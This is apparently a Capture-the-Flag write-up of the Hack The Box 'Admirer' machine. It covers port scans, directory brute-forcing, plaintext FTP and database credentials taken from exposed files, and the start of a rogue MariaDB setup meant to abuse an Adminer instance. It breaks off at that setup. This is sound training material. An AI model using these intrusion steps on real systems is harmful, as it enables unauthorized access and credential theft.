# Hack the Box - Admirer

```CSS
Machine IP: 10.10.10.187 - Linux
```

# Reconaissance
## NMAP (Surface)
```CSS
▶ nmap -Pn -sS -p- 10.10.10.187 -T4 --min-rate 1000 -oN nmap.surface

Nmap scan report for 10.10.10.187
Host is up (0.100s latency).
Not shown: 65532 closed tcp ports (reset)

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 75.35 seconds
```

## NMAP (Deep)
```CSS
▶ nmap -sC -sV -p 21,22,80 10.10.10.187 -oN nmap.deep

Nmap scan report for 10.10.10.187
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a71e92163699dcbdd84021a2397e1b9 (RSA)
|   256 c595b6214d46a425557a873e19a8e702 (ECDSA)
|_  256 d02dddd05c42f87b315abe57c4a9a756 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-title: Admirer
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
```

## Application (Port 80)
![image](https://user-images.githubusercontent.com/83878909/229423143-85c36971-4509-41d0-8710-63c5cf8efe6e.png)

## Brute-Force (Common Directories and Files)
```
▶ gobuster dir --url http://10.10.10.187 --wordlist /seclists/Discovery/Web-Content/common.txt --threads 25
```
![image](https://user-images.githubusercontent.com/83878909/229427047-c09451d1-a6ed-4ccd-89aa-bae599dea65b.png)
  - robots.txt
![image](https://user-images.githubusercontent.com/83878909/229427379-501aadd4-818e-4d55-97d8-daf7fec60a39.png)

```CSS
▶ gobuster dir --url http://10.10.10.187/admin-dir --wordlist /seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extensions php,txt --threads 25
```
![image](https://user-images.githubusercontent.com/83878909/229438336-3f85f7f9-f2b0-4f1f-b238-97f066754b5f.png)
  - contacts.txt
  - credentials.txt
![image](https://user-images.githubusercontent.com/83878909/229438499-9d4192a2-b214-4cdd-b026-8abcf9009cb0.png)
![image](https://user-images.githubusercontent.com/83878909/229438595-3c5b4ddc-cd03-46be-b12a-5a6d84e6b361.png)

---

## FTP Login
  - FTP Login: `ftpuser:%n?4Wz}R$tTF7`
![image](https://user-images.githubusercontent.com/83878909/229441021-6974e5c6-1dd5-4819-97ed-e76d136aab22.png)
  - Download Files: `dump.sql` and `html.tar.gz`.
![image](https://user-images.githubusercontent.com/83878909/229441387-3b270388-ef2e-425b-b68a-1e0b7037d075.png)
  - `dump.sql` : No useful information.
  - `html.tar.gz` : `▶ tar -xvzf html.tar.gz`
![image](https://user-images.githubusercontent.com/83878909/229442818-fc7ff4da-a787-4434-9e9e-b9a0b3ee8cf9.png)
  - `index.php` : Database credentials found `waldo:]F7jLHw:*G>UPrTo}~A"d6b`
![image](https://user-images.githubusercontent.com/83878909/229444624-5870fc15-d309-4d7c-a85a-8c0a5511660d.png)
  - `/utility-scripts/db_admin.php`: Database credentials found `waldo:Wh3r3_1s_w4ld0?`
![image](https://user-images.githubusercontent.com/83878909/229447920-b34a8efb-769a-42de-a16f-a6e808de9bc4.png)
  - `w4ld0s_s3cr3t_d1r/credentials.txt`
![image](https://user-images.githubusercontent.com/83878909/229448581-7a114624-eb66-4323-bdab-bab29630636b.png)

---

## Brute-Force
```
▶ gobuster dir --url http://10.10.10.187/utility-scripts/ --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt --extensions php,txt  --threads 50
```
![image](https://user-images.githubusercontent.com/83878909/229453408-bae74a9a-7686-4194-a828-c8bf131204e1.png)

---

## Application
  - Adminer
![image](https://user-images.githubusercontent.com/83878909/229453875-f4a1d735-6a09-4bb5-a360-44caae6481ce.png)
  - About [Adminer vulnerability](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool).

### Create MariaDB Database and User
  1. Start MariaDB : `systemctl start mariadb`
  2. Login to MariaDB : `mysql -u root -p` (The password is root)
  3. Create database : `CREATE DATABASE temp; USE temp; CREATE TABLE temp (name VARCHAR(2000));`
  4. Create User : `CREATE USER 'random'@'10.10.14.34' IDENTIFIED BY 'passwd';`
  5. Grant Privileges : `GRANT ALL PRIVILEGES ON temp.* TO 'random'@'10.10.14.34';`
